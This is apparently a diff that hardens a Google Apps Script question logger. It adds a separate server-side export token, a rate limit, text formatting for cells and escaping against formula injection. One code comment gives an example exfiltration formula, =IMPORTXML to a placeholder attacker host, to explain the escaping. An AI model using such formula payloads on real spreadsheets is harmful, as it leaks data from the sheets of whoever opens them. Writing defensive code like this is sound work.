@@ -45,6 +45,42 @@ var SHARED_TOKEN = "a84625f7acfb218fd18482c16cf67ee4";
 var ALLOWED_PAGE_PREFIX = "https://mellow-wet.jp";
 var MAX_QUESTION_LEN = 500;
 
+// ▼ ログ閲覧用トークン
+// SHARED_TOKEN は公開JS内に書くため誰でも読めます。書き込みと閲覧を同じ
+// トークンで守ると、JSを見た人が ?action=export で質問ログを全部ダウンロード
+// できてしまいます（訪問者の質問には個人的な事情が書かれていることがある）。
+// そのため閲覧は別トークンで守りますが、その値はこのファイルに書きません。
+// このリポジトリは公開されているため、ここに書くと結局誰でも読めるからです。
+// 値はスクリプト プロパティ（サーバー側の保管領域）に置きます。
+//
+// 【使い方】ログをエクスポートしたくなったら、スクリプトエディタで
+// setupExportToken を1回実行してください。トークンが発行され実行ログに出ます。
+// 未設定の間はエクスポート機能は常に拒否されます（既定で閉じている状態）。
+var EXPORT_TOKEN_PROP = "EXPORT_TOKEN";
+
+function getExportToken_() {
+  try {
+    return PropertiesService.getScriptProperties().getProperty(EXPORT_TOKEN_PROP) || "";
+  } catch (e) {
+    return "";
+  }
+}
+
+// 閲覧用トークンを発行して保存する（手動で1回だけ実行）。
+// 実行ログに出た値を tools/harvest-questions.mjs に環境変数で渡します:
+//   MELLOW_EXPORT_TOKEN="発行された値" node tools/harvest-questions.mjs
+function setupExportToken() {
+  var t = Utilities.getUuid().replace(/-/g, "") + Utilities.getUuid().replace(/-/g, "").slice(0, 8);
+  PropertiesService.getScriptProperties().setProperty(EXPORT_TOKEN_PROP, t);
+  Logger.log("閲覧用トークンを発行しました。この値は他人に渡さないでください:\n" + t);
+  return t;
+}
+
+// ▼ 流量制限（1分あたりの受理件数）
+// 公開エンドポイントなので、トークンが漏れれば大量書き込みでシートを汚せる。
+// 通常の訪問者が1分に何十件も質問することはないため、超過分は静かに捨てる。
+var MAX_WRITES_PER_MINUTE = 20;
+
 function doPost(e) {
   try {
     var data = {};
@@ -64,20 +100,24 @@ function doPost(e) {
     if (!pageOk) {
       return json_({ ok: false, error: "bad origin" });
     }
+    if (!underRateLimit_()) {
+      return json_({ ok: false, error: "rate limited" });
+    }
     var question = String(data.question || "").slice(0, MAX_QUESTION_LEN);
 
     var sheet = getSheet_();
     var now = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
 
+    // 訪問者が書いた文字列は、すべて数式にならない形に落としてから入れる。
     sheet.appendRow([
       now,
-      question,
+      cellText_(question),
       data.hit ? "○" : "×（未回答）",
-      data.matched || "",
+      cellText_(data.matched),
       data.source === "preset" ? "ボタン" : (data.source === "feedback" ? "評価" : "自由入力"),
-      page,
-      data.ua || "",
-      data.outcome || ""
+      cellText_(page),
+      cellText_(data.ua),
+      cellText_(data.outcome)
     ]);
 
     return json_({ ok: true });
@@ -109,8 +149,11 @@ var LEARN_OUTCOMES = { fallback: true, suggested: true, unresolved: true };
 // ログをJSONで書き出す。tools/harvest-questions.mjs から呼ばれる想定。
 // 個人情報は記録時に伏字化済み（maskPII）なので、保存値をそのまま返す。
 function exportLog_(p) {
-  // 書き込みと同じ共有トークンで保護（漏えい時の閲覧を防ぐ）
-  if (SHARED_TOKEN && String(p.token || "") !== SHARED_TOKEN) {
+  // 閲覧は専用トークンのみで許可する。書き込み用の SHARED_TOKEN は公開JSに
+  // 載っているため、それで閲覧を許すと誰でも質問ログを吸い出せてしまう。
+  // 未発行なら常に拒否（既定で閉じている＝設定し忘れが穴にならない）。
+  var expected = getExportToken_();
+  if (!expected || String(p.token || "") !== expected) {
     return json_({ ok: false, error: "unauthorized" });
   }
 
@@ -162,6 +205,37 @@ function exportLog_(p) {
   return json_({ ok: true, count: rows.length, rows: rows });
 }
 
+// 訪問者の入力をセルに入れる前に「ただの文字列」へ落とす。
+// ------------------------------------------------------------------
+// スプレッドシートは "=" "+" "-" "@" で始まる値を数式として解釈する。
+// つまり質問欄に =IMPORTXML("https://攻撃者/?d="&A1) と打たれると、
+// シートを開いた本人のブラウザで実行され、隣のセルの内容が外部へ送られる。
+// （HYPERLINK で偽リンクを仕込む、IMAGE で外部にアクセスさせる等も同様。）
+// 先頭に ' を付けると Sheets は常に文字列として扱い、表示上 ' は出ない。
+function cellText_(v) {
+  var s = String(v == null ? "" : v);
+  if (s === "") return "";
+  // 制御文字（改行・タブ）は行崩れと判定回避に使われるため潰す
+  s = s.replace(/[\r\n\t]+/g, " ");
+  if (/^[=+\-@]/.test(s)) return "'" + s;
+  return s;
+}
+
+// 1分あたりの受理件数を制限する。CacheService はスクリプト単位の共有領域。
+// 上限に達している間は false を返し、呼び出し側で書き込みを見送る。
+function underRateLimit_() {
+  if (!MAX_WRITES_PER_MINUTE) return true;
+  try {
+    var cache = CacheService.getScriptCache();
+    var key = "w:" + Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyyMMddHHmm");
+    var n = parseInt(cache.get(key) || "0", 10) + 1;
+    cache.put(key, String(n), 120);   // 2分保持（分キーなので実質1分窓）
+    return n <= MAX_WRITES_PER_MINUTE;
+  } catch (e) {
+    return true;   // キャッシュが使えない時は記録を止めない
+  }
+}
+
 function getSheet_() {
   var ss = SpreadsheetApp.getActiveSpreadsheet();
   var sheet = ss.getSheetByName(SHEET_NAME);
@@ -173,11 +247,13 @@ function getSheet_() {
     sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight("bold");
     sheet.setFrozenRows(1);
   }
-  // 日時列は「文字列」で持つ。書式が自動のままだと "2026-08-16 21:45:50" を
-  // スプレッドシートが日付型と解釈してしまい、exportLog_ の期間判定
-  // （固定幅の文字列比較）が成立しなくなって days 指定が無視される。
+  // データ行はすべて「文字列」書式にする。理由は2つ。
+  //  ① 日時が日付型になると exportLog_ の期間判定（固定幅の文字列比較）が
+  //     成立せず days 指定が無視される
+  //  ② 書式が自動のままだと "=..." が数式として評価される。cellText_ で
+  //     先頭に ' を付けているが、書式側でも二重に止めておく
   if (sheet.getRange("A2").getNumberFormat() !== "@") {
-    sheet.getRange(2, 1, sheet.getMaxRows() - 1, 1).setNumberFormat("@");
+    sheet.getRange(2, 1, sheet.getMaxRows() - 1, HEADERS.length).setNumberFormat("@");
   }
   return sheet;
 }
@@ -189,6 +265,34 @@ function normalizeDate_(v) {
     return Utilities.formatDate(v, "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
   }
   return String(v || "");
+}
+
+// ------------------------------------------------------------------
+// 手動メンテ用：テスト行の掃除
+// ------------------------------------------------------------------
+// スクリプトエディタで関数 clearTestRows を選んで実行すると、動作確認で
+// 入れた行（UAが setup-test / sec / flood… の行）だけを削除します。
+// 訪問者の実データ（UAが "iOS / Safari" のような形）には触りません。
+var TEST_UA_MARKERS = ["setup-test", "sec", "flood", "flood2"];
+
+function clearTestRows() {
+  var sheet = getSheet_();
+  var last = sheet.getLastRow();
+  if (last < 2) return;
+  var header = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
+  var iUA = header.indexOf("UA");
+  if (iUA < 0) return;
+  var values = sheet.getRange(2, 1, last - 1, header.length).getValues();
+  var removed = 0;
+  // 下から消す（上から消すと行番号がずれる）
+  for (var r = values.length - 1; r >= 0; r--) {
+    var ua = String(values[r][iUA] || "");
+    if (TEST_UA_MARKERS.indexOf(ua) !== -1) {
+      sheet.deleteRow(r + 2);
+      removed++;
+    }
+  }
+  Logger.log("削除した行数: " + removed);
 }
 
 function json_(obj) {
